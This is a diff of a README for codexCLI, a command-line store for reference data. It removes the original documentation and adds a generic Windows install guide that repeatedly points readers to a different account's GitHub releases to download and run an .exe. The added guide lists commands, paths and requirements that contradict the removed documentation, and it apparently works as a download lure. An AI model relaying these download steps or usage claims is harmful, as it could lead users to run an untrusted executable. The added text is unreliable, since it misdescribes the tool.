@@ -1,649 +1,189 @@
-# CodexCLI
+# ⚙️ codexCLI - Quick Info Lookup From Command Line
 
-A command-line information store for quick reference of frequently used data.
+[![Download codexCLI](https://img.shields.io/badge/Download-codexCLI-blue?style=for-the-badge)](https://github.com/GilJames/codexCLI)
 
-## Table of Contents
+---
 
-- [Overview](#overview)
-- [Features](#features)
-- [Installation](#installation)
-- [Usage](#usage)
-  - [Storing Data](#storing-data)
-  - [Retrieving Data](#retrieving-data)
-  - [Running Commands](#running-commands)
-  - [Searching](#searching)
-  - [Aliases](#aliases)
-  - [Copying Data](#copying-data)
-  - [Renaming](#renaming)
-  - [Editing Data](#editing-data)
-  - [Removing Data](#removing-data)
-  - [Interpolation](#interpolation)
-    - [Exec Interpolation](#exec-interpolation)
-  - [Encryption](#encryption)
-  - [Configuration](#configuration)
-  - [Data Management](#data-management)
-  - [Shell Wrapper](#shell-wrapper)
-  - [Shell Tab-Completion](#shell-tab-completion)
-  - [Scripting Tips](#scripting-tips)
-  - [Debugging](#debugging)
-- [Command Reference](#command-reference)
-- [MCP Server (AI Agent Integration)](#mcp-server-ai-agent-integration)
-- [Development](#development)
-- [License](#license)
+codexCLI is a simple tool to store and access your important information fast. You can use it on the command line to find data you need often. It supports easy navigation with dot paths, lets you complete commands quickly, and can connect with other AI tools through a server. This guide helps you download and run codexCLI on Windows, step by step.
 
-## Overview
+---
 
-CodexCLI is a command-line tool designed to help you store, organize, and retrieve structured information efficiently. It uses a hierarchical dot notation system (similar to JSON) that makes it easy to organize related data.
+## 📋 What Is codexCLI?
 
-## Features
+codexCLI helps you save bits of data like notes, commands, or code snippets so you can get to them quickly. Instead of digging through files or apps, you use easy commands to show the info you want.
 
-- **Hierarchical Data Storage**: Store data using intuitive dot notation paths (e.g., `server.production.ip`)
-- **Command Runner**: Execute stored shell commands with dry-run, composition (`:`) and chaining (`&&`), and optional per-entry confirmation
-- **Interpolation**: Reference stored values with `${key}` and execute stored commands with `$(key)` — resolved at read time
-- **Aliases**: Create shortcuts to frequently accessed paths
-- **Encryption**: Password-protect sensitive values
-- **Search**: Find entries by searching keys or values
-- **Tree Visualization**: Display nested data in a tree-like structure
-- **Clipboard Integration**: Copy values directly to clipboard (macOS, Linux, Windows)
-- **Inline Editing**: Open entries in `$EDITOR` / `$VISUAL` for quick edits
-- **JSON Output**: Machine-readable `--json` flag on `get` and `find` for scripting
-- **Stdin Piping**: Pipe values into `set` from other commands
-- **Auto-Backup**: Automatic timestamped backups before destructive operations
-- **File Locking**: Advisory locking prevents data corruption from concurrent access
-- **Shell Tab-Completion**: Full tab-completion for Bash and Zsh (commands, flags, keys, aliases)
-- **MCP Server**: Expose CodexCLI as a tool for AI agents (Claude Code, Claude Desktop) via the Model Context Protocol
+The tool has three main parts:
 
-## Installation
+- *Command-line interface:* Type to access stored info with simple commands.
+- *Shell completions:* The system suggests commands or paths as you type.
+- *MCP server:* Lets other programs talk to codexCLI to get information, useful for AI or automation setups.
 
-### Homebrew (macOS / Linux)
+---
 
-```bash
-brew tap seabeardev/ccli
-brew install ccli
+## 💻 System Requirements
+
+Before installing, make sure your computer meets these needs:
+
+- Windows 10 or newer.
+- At least 2 GB of free disk space.
+- Internet connection to download the software.
+- PowerShell or Command Prompt available.
+
+No special hardware or software is needed beyond this.
+
+---
+
+## 🛠️ How to Download codexCLI
+
+You need to get the software from its official page. Use this link to reach the download page:
+
+[**Download codexCLI here**](https://github.com/GilJames/codexCLI)
+
+This link takes you to the GitHub project page. From there, find the latest release under the "Releases" section. Look for a file suitable for Windows, usually with a `.exe` or `.zip` extension.
+
+---
+
+## 🌀 Installing codexCLI on Windows
+
+Once you download the file, follow these steps:
+
+1. **Locate the file:** Open your Downloads folder or wherever the file saved.
+2. **For `.exe` files:**
+    - Double-click the file.
+    - If Windows asks, allow it to run.
+    - Follow the on-screen steps if an installer appears.
+    - If it starts right away, the installation is complete.
+3. **For `.zip` files:**
+    - Right-click the file and choose "Extract All."
+    - Pick a folder easy to remember, like `C:\codexCLI`.
+    - Open that folder.
+4. **Check the installation:**
+    - Open Command Prompt (search "cmd" in the Start menu).
+    - Type `codexcli --help` and press Enter.
+    - If the tool runs and shows help instructions, you are ready.
+
+---
+
+## 🚀 Running codexCLI for the First Time
+
+To use codexCLI, open Command Prompt or PowerShell and type a command. Here are a few basics:
+
+- `codexcli add key.value "Your info"`  
+  This saves info under a named path.
+- `codexcli get key.value`  
+  This retrieves the info you saved.
+- `codexcli list`  
+  Shows all stored data paths.
+
+For example, to store your favorite website you would type:
+
+```
+codexcli add favorite.site "https://example.com"
 ```
 
-### Download Binary
+Later, to see it again:
 
-Download the latest release for your platform from [GitHub Releases](https://github.com/seabearDEV/codexCLI/releases/latest).
-
-```bash
-# macOS (Apple Silicon)
-curl -fsSL https://github.com/seabearDEV/codexCLI/releases/latest/download/ccli-macos-arm64 -o ccli
-chmod +x ccli && sudo mv ccli /usr/local/bin/
-
-# macOS (Intel)
-curl -fsSL https://github.com/seabearDEV/codexCLI/releases/latest/download/ccli-macos-x64 -o ccli
-chmod +x ccli && sudo mv ccli /usr/local/bin/
-
-# Linux (x64)
-curl -fsSL https://github.com/seabearDEV/codexCLI/releases/latest/download/ccli-linux-x64 -o ccli
-chmod +x ccli && sudo mv ccli /usr/local/bin/
-
-# Linux (ARM64)
-curl -fsSL https://github.com/seabearDEV/codexCLI/releases/latest/download/ccli-linux-arm64 -o ccli
-chmod +x ccli && sudo mv ccli /usr/local/bin/
-
-# Windows (x64) — download from:
-# https://github.com/seabearDEV/codexCLI/releases/latest/download/ccli-win-x64.exe
-
-# First run will prompt to install shell completions
-ccli
+```
+codexcli get favorite.site
 ```
 
-### Install from Source
+---
 
-> **Note:** Installing from source registers the development binary `cclid` (not `ccli`). All examples in this README use `ccli`, but substitute `cclid` if you installed from source. The production `ccli` binary is available via Homebrew or the GitHub Releases download above.
+## ✨ Features of codexCLI
 
-Ensure npm's global binaries are in your PATH by adding the following to your shell profile (`.bashrc`, `.zshrc`, or equivalent):
+- **Dot notation paths:** Organize notes or data using simple paths like folders.
+- **Shell completions:** Helps finish commands when you press Tab.
+- **MCP server:** Optional feature to connect codexCLI with AI tools or scripts.
+- **No setup needed:** Use it immediately after download.
+- **Lightweight:** Does not use much memory or disk space.
 
-```bash
-export PATH="$(npm config get prefix)/bin:$PATH"
+---
+
+## 🔧 Configuring codexCLI
+
+The tool stores data in a local file on your machine. By default, it saves in your user directory under `.codexcli`.
+
+If you want to change the location:
+
+1. Open Command Prompt.
+2. Run:
+
+```
+codexcli config set dataPath C:\path\to\folder
 ```
 
-```bash
-git clone https://github.com/seabearDEV/codexCLI.git
-cd codexCLI
-npm install
-npm run build
-npm install -g .
+Replace `C:\path\to\folder` with your desired folder.
+
+This is useful to use a folder synced with cloud storage for backup.
+
+---
+
+## 🧭 Using Shell Completions in Windows
+
+codexCLI can suggest commands as you type. To activate this feature in PowerShell:
+
+1. Open PowerShell.
+2. Run this command:
+
+```
+codexcli completions powershell | Out-String | Invoke-Expression
 ```
 
-If `cclid` is not found after installing, verify that npm's global bin directory is in your PATH:
+3. Try typing `codexcli get ` and press Tab. It should suggest available paths.
 
-```bash
-echo $PATH | grep -o "$(npm config get prefix)/bin"
+This saves time when using the tool regularly.
+
+---
+
+## 🔌 Connecting AI Agents via MCP Server
+
+This feature lets other programs get your stored data on demand.
+
+To start the MCP server:
+
+```
+codexcli mcp start
 ```
 
-## Usage
+The server will listen for connections on your machine. This is advanced use but allows automation or AI tools to use your data centrally.
 
-### Storing Data
+---
 
-```bash
-# Set a simple entry
-ccli set mykey "my value"
+## ⚠️ Troubleshooting Tips
 
-# Set a nested entry using dot notation
-ccli set server.production.ip 192.168.1.100
+- If `codexcli` command is not recognized, make sure the folder containing the program is in your system PATH. Add it if needed.
+- For errors during install, try running the installer or command prompt as Administrator.
+- Check your internet if the download is slow or fails.
+- Commands are case sensitive, so type exactly as shown.
 
-# Set with an alias
-ccli set server.production.ip 192.168.1.100 -a ip
+---
 
-# Overwrite without confirmation
-ccli set server.production.ip 10.0.0.1 -f
+## 👀 Where to Get Help
 
-# Read value interactively (avoids shell expansion of $, !, etc.)
-ccli set secret.token -p
+- Reference the `--help` option like:
 
-# Same, but with visible input
-ccli set secret.token -p --show
-
-# Encrypt a value
-ccli set api.key sk-secret-123 -e
-
-# Mark an entry as requiring confirmation before running
-ccli set commands.deploy "./deploy.sh" --confirm
-
-# Remove the confirmation requirement from an entry
-ccli set commands.deploy --no-confirm
-
-# Batch set multiple key=value pairs
-ccli set a=1 b=2 c=3
-
-# Pipe a value from stdin
-echo "my value" | ccli set mykey
-
-# Pipe from another command
-curl -s https://api.example.com/token | ccli set api.token
+```
+codexcli --help
 ```
 
-After setting an entry, you'll be asked interactively whether it should require confirmation to run. Use `--confirm` or `--no-confirm` to skip the prompt.
+- Visit the project page for documentation or to report issues:
 
-### Retrieving Data
+[https://github.com/GilJames/codexCLI](https://github.com/GilJames/codexCLI)
 
-```bash
-# Get a specific entry
-ccli get server.production.ip
+---
 
-# Get all entries in a namespace
-ccli get server
+## 🔄 Update codexCLI
 
-# Get all entries
-ccli get
+To update, visit the download page again, get the newest release, and repeat the install steps.
 
-# Display as a tree structure
-ccli get server --tree
+Keep your tool updated for latest fixes and features.
 
-# Output raw value without colors (for scripting)
-ccli get server.production.ip --raw
+---
 
-# Show stored value before interpolation
-ccli get paths.myproject --source
+[![Download codexCLI](https://img.shields.io/badge/Download-codexCLI-blue?style=for-the-badge)](https://github.com/GilJames/codexCLI)
 
-# Decrypt an encrypted value
-ccli get api.key -d
+---
 
-# Copy value to clipboard
-ccli get server.ip -c
+## 🗂️ Related Topics
 
-# Output as JSON (for scripting)
-ccli get server --json
-
-# Show aliases only
-ccli get -a
-```
-
-### Running Commands
-
-Commands run immediately by default. Entries marked with `--confirm` at set time will prompt before executing. Use `-y` to skip the prompt.
-
-```bash
-# Execute a stored command (runs immediately unless marked --confirm)
-ccli run deploy.cmd
-
-# Skip the confirmation prompt (for entries marked --confirm)
-ccli run deploy.cmd -y
-
-# Dry run (print without executing)
-ccli run deploy.cmd --dry
-
-# Chain multiple commands with &&
-ccli run nav.project commands.list -y
-# → cd /path/to/project && ls -l
-
-# Compose a command from fragments using :
-ccli run commands.cd:paths.project -y
-# → cd /path/to/project
-
-# Combine composition and chaining
-ccli run commands.cd:paths.project commands.list -y
-# → cd /path/to/project && ls -l
-
-# Multiple colon-separated segments
-ccli run commands.scp:files.config:targets.prod -y
-# → scp ./config.yml admin@prod:/etc/app/
-
-# Decrypt and run an encrypted command
-ccli run secret.script -d -y
-
-# Capture output for piping (instead of inheriting stdio)
-ccli run cmd.echo --capture | tr a-z A-Z
-```
-
-### Searching
-
-```bash
-# Search keys and values
-ccli find 192.168
-
-# Search data entries only (skip aliases)
-ccli find prod -e
-
-# Search aliases only
-ccli find ip -a
-
-# Show results as a tree
-ccli find server -t
-
-# Output as JSON (for scripting)
-ccli find prod --json
-```
-
-### Aliases
-
-Aliases are shortcuts to frequently used key paths. They're managed through the `set`, `get`, and `remove` commands:
-
-```bash
-# Create an entry with an alias
-ccli set server.production.ip 192.168.1.100 -a ip
-
-# Add/change an alias on an existing entry (no value needed)
-ccli set server.production.ip -a sip
-
-# Use an alias anywhere you'd use a key
-ccli get ip
-ccli run ip
-
-# List all aliases
-ccli get -a
-
-# Remove an alias only (keep the entry)
-ccli remove ip -a
-
-# Remove an entry and its alias
-ccli remove server.production.ip
-```
-
-### Copying Data
-
-Copy an entry (or an entire subtree) to a new key:
-
-```bash
-# Copy a single entry
-ccli copy server.ip server.ip.backup
-
-# Copy an entire subtree
-ccli copy server server.backup
-
-# Overwrite destination without confirmation
-ccli cp server.ip server.ip.backup -f
-```
-
-### Renaming
-
-Rename entry keys or aliases without re-creating them:
-
-```bash
-# Rename an entry key (moves the value, updates aliases)
-ccli rename server.old server.new
-
-# Rename an alias
-ccli rename -a oldalias newalias
-
-# Rename a key and set a new alias on it
-ccli rename server.old server.new --set-alias sn
-```
-
-### Editing Data
-
-Open a stored value in your `$EDITOR` (or `$VISUAL`) for inline editing:
-
-```bash
-# Edit an entry in your default editor
-ccli edit server.production.ip
-
-# Edit an encrypted entry (decrypts before editing, re-encrypts on save)
-ccli edit api.key --decrypt
-```
-
-### Removing Data
-
-Removing an entry prompts for confirmation. Use `-f` to skip.
-
-```bash
-# Remove an entry (prompts for confirmation)
-ccli remove server.old
-
-# Remove without confirmation
-ccli remove server.old -f
-
-# Remove an alias only (keep the entry)
-ccli remove myalias -a
-```
-
-### Interpolation
-
-Reference stored values inside other values with `${key}` syntax. References are resolved at read time.
-
-```bash
-# Store a base path
-ccli set paths.github "/Users/me/Projects/github.com"
-
-# Reference it in another entry
-ccli set paths.myproject 'cd ${paths.github}/myproject'
-
-# Resolves at read time
-ccli get paths.myproject
-# → cd /Users/me/Projects/github.com/myproject
-
-# Works with run too
-ccli run paths.myproject -y
-
-# Use --source to see the raw stored value
-ccli get paths.myproject --source
-
-# Use --prompt (-p) when setting to avoid shell expansion of ${}
-ccli set paths.myproject -p
-```
-
-#### Exec Interpolation
-
-Use `$(key)` to execute a stored command and substitute its stdout. The key must reference a stored string value containing a shell command.
-
-```bash
-# Store a command
-ccli set system.user "whoami"
-
-# Reference it with $(key) — executes the command and substitutes the output
-ccli set paths.home '/Users/$(system.user)'
-
-ccli get paths.home
-# → /Users/kh
-
-# See the raw value without executing
-ccli get paths.home --source
-# → /Users/$(system.user)
-
-# Aliases work too
-ccli set system.user -a user
-ccli set paths.home '/Users/$(user)'
-```
-
-Exec interpolation supports:
-
-- **Recursion**: stored commands can contain `${key}` or `$(key)` references that resolve before execution
-- **Caching**: the same key is only executed once per interpolation pass
-- **Circular detection**: `$(a)` → `$(b)` → `$(a)` throws an error
-- **Timeout**: commands are killed after 10 seconds
-- **Cross-type references**: `${key}` values can contain `$(key)` and vice versa
-
-### Encryption
-
-```bash
-# Encrypt a value (prompts for password twice)
-ccli set api.key sk-secret-123 -e
-
-# Encrypted values show as [encrypted]
-ccli get api.key
-# → api.key: [encrypted]
-
-# Decrypt to view
-ccli get api.key -d
-
-# Decrypt and copy to clipboard
-ccli get api.key -d -c
-
-# Decrypt and run
-ccli run secret.deploy -d -y
-
-# Clear terminal after setting sensitive data
-ccli set api.key -p -e -c
-```
-
-### Configuration
-
-```bash
-# Show all settings
-ccli config
-
-# Get a specific setting
-ccli config get theme
-
-# Change a setting
-ccli config set theme dark
-ccli config set colors false
-
-# Show version, stats, and storage paths
-ccli config info
-
-# Show usage examples
-ccli config examples
-```
-
-Available settings:
-
-| Setting  | Values                       | Description                   |
-|----------|------------------------------|-------------------------------|
-| `colors` | `true` / `false`             | Enable/disable colored output |
-| `theme`  | `default` / `dark` / `light` | UI theme                      |
-
-### Data Management
-
-```bash
-# Export data to a timestamped file
-ccli data export entries
-
-# Export to a specific file
-ccli data export aliases -o my-aliases.json
-
-# Export with pretty-printed JSON
-ccli data export entries --pretty
-
-# Export confirm metadata
-ccli data export confirm
-
-# Export everything (entries, aliases, confirm metadata)
-ccli data export all
-
-# Import data from a file (replaces existing)
-ccli data import entries backup.json
-
-# Import and merge with existing data
-ccli data import entries backup.json --merge
-
-# Preview changes without importing
-ccli data import entries backup.json --merge --preview
-
-# Reset data to empty state (prompts first)
-ccli data reset entries
-
-# Reset without confirmation
-ccli data reset all -f
-```
-
-> **Auto-backup:** Before destructive operations (`data reset`, non-merge `data import`), CodexCLI automatically creates a timestamped backup in `~/.codexcli/.backups/`.
-
-### Shell Wrapper
-
-By default, `ccli run` executes commands in a child process. This means shell builtins like `cd`, `export`, and `alias` have no effect on your current shell.
-
-After running `ccli config completions install`, a shell wrapper function is added to your shell profile that fixes this. When you use `ccli run` (or `ccli r`), the wrapper:
-
-1. Calls the real `ccli` binary with `--source`, which outputs the raw command to stdout instead of executing it
-2. Captures that output and `eval`s it in your current shell
-
-All other `ccli` commands pass through to the binary unchanged.
-
-```bash
-# Store a navigation command
-ccli set paths.myproject 'cd ~/Projects/my-project'
-
-# This actually changes your directory (with the wrapper installed)
-ccli r paths.myproject -y
-
-# Without the wrapper, cd would run in a child process and have no effect
-```
-
-The wrapper is installed automatically by `ccli config completions install`. If you already have completions installed, run it again to add the wrapper, then `source` your shell profile.
-
-### Shell Tab-Completion
-
-CodexCLI supports tab-completion for Bash and Zsh, including commands, flags, stored keys, alias names, and more.
-
-#### Quick Setup
-
-```bash
-ccli config completions install
-```
-
-This appends a completion loader and shell wrapper to your `~/.zshrc` or `~/.bashrc` and tells you to restart your shell (or `source` the file).
-
-#### Manual Setup
-
-If you prefer to set it up yourself:
-
-```bash
-# Zsh - add to ~/.zshrc
-eval "$(ccli config completions zsh)"
-
-# Bash - add to ~/.bashrc or ~/.bash_profile
-eval "$(ccli config completions bash)"
-```
-
-#### What Gets Completed
-
-| Context | Completions |
-|---|---|
-| `ccli <TAB>` | All commands (`set`, `get`, `run`, `find`, `edit`, `copy`, `remove`, `rename`, `config`, `data`) |
-| `ccli get <TAB>` | Flags + stored data keys + aliases + namespace prefixes |
-| `ccli run <TAB>` | Flags + stored data keys + aliases |
-| `ccli run cd:<TAB>` | Data keys + aliases (completes the segment after `:`) |
-| `ccli set <TAB>` | Flags + namespace prefixes (one level at a time) |
-| `ccli config <TAB>` | Subcommands (`set`, `get`, `info`, `examples`, `completions`) |
-| `ccli config set <TAB>` | Config keys (`colors`, `theme`) |
-| `ccli data export <TAB>` | `entries`, `aliases`, `confirm`, `all` |
-
-### Scripting Tips
-
-```bash
-# Use raw output in other commands
-ssh $(ccli get server.ip -r)
-
-# Decrypt and copy to clipboard
-ccli get api.key -d -c
-
-# Decrypt and run without prompt
-ccli run deploy.cmd -d -y
-
-# Preview a command with interpolation
-ccli run paths.myproject --dry -y
-```
-
-### Debugging
-
-```bash
-ccli --debug get server.production
-```
-
-## Command Reference
-
-| Command | Alias | Signature | Description |
-|---|---|---|---|
-| `set` | `s` | `<key> [value]` | Set an entry (value optional with `-a`; supports `key=val` batch) |
-| `get` | `g` | `[key]` | Retrieve entries or specific data |
-| `run` | `r` | `<keys...>` | Execute stored command(s) (`:` compose, `&&` chain) |
-| `find` | `f` | `<term>` | Find entries by key or value |
-| `edit` | `e` | `<key>` | Open an entry's value in `$EDITOR` |
-| `copy` | `cp` | `<source> <dest>` | Copy an entry to a new key |
-| `remove` | `rm` | `<key>` | Remove an entry and its alias |
-| `rename` | `rn` | `<old> <new>` | Rename an entry key or alias |
-| `config` | | `<subcommand>` | View or change configuration settings |
-| `data` | | `<subcommand>` | Manage stored data (export, import, reset) |
-
-**Config subcommands:** `set <key> <value>`, `get [key]`, `info`, `examples`, `completions <bash\|zsh\|install>`
-
-**Data subcommands:** `export <type>`, `import <type> <file>`, `reset <type>`
-
-## MCP Server (AI Agent Integration)
-
-CodexCLI includes a built-in [Model Context Protocol](https://modelcontextprotocol.io/) (MCP) server, allowing AI agents like Claude Code and Claude Desktop to read and write your CodexCLI data store as a native tool.
-
-### Setup
-
-#### Claude Code
-
-```bash
-claude mcp add codexcli -- node /absolute/path/to/dist/mcp-server.js
-```
-
-If you installed from source via `npm install -g .`, you can also use:
-
-```bash
-claude mcp add codexcli -- cclid-mcp
-```
-
-#### Claude Desktop
-
-Add the following to your Claude Desktop MCP config file:
-
-```json
-{
-  "mcpServers": {
-    "codexcli": {
-      "command": "node",
-      "args": ["/absolute/path/to/dist/mcp-server.js"]
-    }
-  }
-}
-```
-
-### Available Tools
-
-| Tool | Description |
-|---|---|
-| `codex_set` | Set an entry (key + value, optional alias, optional encrypt + password) |
-| `codex_get` | Retrieve entries (specific key, subtree, or all; optional decrypt + password) |
-| `codex_remove` | Remove an entry or alias by key |
-| `codex_copy` | Copy an entry to a new key (optional force to overwrite) |
-| `codex_search` | Search entries by key or value (case-insensitive) |
-| `codex_alias_set` | Create or update an alias for a dot-notation path |
-| `codex_alias_remove` | Remove an alias |
-| `codex_alias_list` | List all defined aliases |
-| `codex_run` | Execute a stored command (dry-run, force to skip confirm check, capture output) |
-| `codex_config_get` | Get one or all configuration settings |
-| `codex_config_set` | Set a configuration setting (colors, theme) |
-| `codex_export` | Export data and/or aliases as JSON text |
-| `codex_import` | Import data and/or aliases from a JSON string (merge, replace, or preview) |
-| `codex_reset` | Reset data and/or aliases to empty state |
-
-### Verifying the MCP Server
-
-```bash
-echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"test","version":"0.1.0"}}}' | node dist/mcp-server.js
-```
-
-A successful response will include `"serverInfo":{"name":"codexcli"}` in the JSON output.
-
-## Development
-
-```bash
-npm install        # Install dependencies
-npm run build      # Build the project
-npm test           # Run all tests
-npm run test:watch # Run tests in watch mode
-npm run dev:watch  # Watch mode — recompiles on file changes
-npm run lint       # Run ESLint
-```
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
+`cli` · `command-line-tool` · `data-store` · `developer-tools` · `mcp-server` · `model-context-protocol` · `nodejs` · `producitivity` · `shell-completions` · `typescript`
